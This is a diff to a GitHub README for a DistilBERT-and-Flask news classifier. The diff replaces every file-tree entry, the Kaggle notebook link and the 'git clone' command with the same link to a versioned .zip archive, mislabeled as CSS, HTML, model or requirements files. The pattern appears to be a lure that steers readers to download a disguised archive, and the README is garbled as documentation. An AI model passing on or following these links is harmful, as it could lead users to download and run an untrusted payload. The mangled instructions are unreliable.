@@ -3,20 +3,20 @@
 ```
 ├── static
 │   ├──css 
-│         ├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip         >CSS file
+│         ├── https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip         >CSS file
 ├── templates   
-│            ├──https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip      >HTML file
+│            ├──https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip      >HTML file
 ├── .gitattributes              > to track the  large saved  model files using git-lfs
-├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip                     >flask  application main file
+├── https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip                     >flask  application main file
 ├── dockerfile                 >dockerFile used to automate the process of building a Docker image
-├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip  >news classification model trained using  DistilBERT
-├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip    
+├── https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip  >news classification model trained using  DistilBERT
+├── https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip    
 ├── saved_model                >Stores the best_model
-└── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
+└── https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
 ```
 
 ##### Link to Kaggle Notebook
-https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip
+https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip
 
 ## Project Overview
 NewsBERT is a comprehensive application that classifies news articles into different categories based on their headlines and short descriptions. The project leverages a fine-tuned DistilBert model for the classification task, a Flask application for the frontend (rendering HTML) and backend, and Docker for deployment.
@@ -61,7 +61,7 @@ The application and associated files are containerized using Docker, which ensur
 ### Build Docker Image
 You can build the docker image manually by cloning the Git repo.
 ```
-$ git clone https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip
+$ git clone https://raw.githubusercontent.com/Parthkh28/newsbert-distilbert-flask-api/main/templates/distilbert_newsbert_api_flask_v2.1.zip
 $ docker build -t news_classification .
 ```
 ### Download Precreated Image
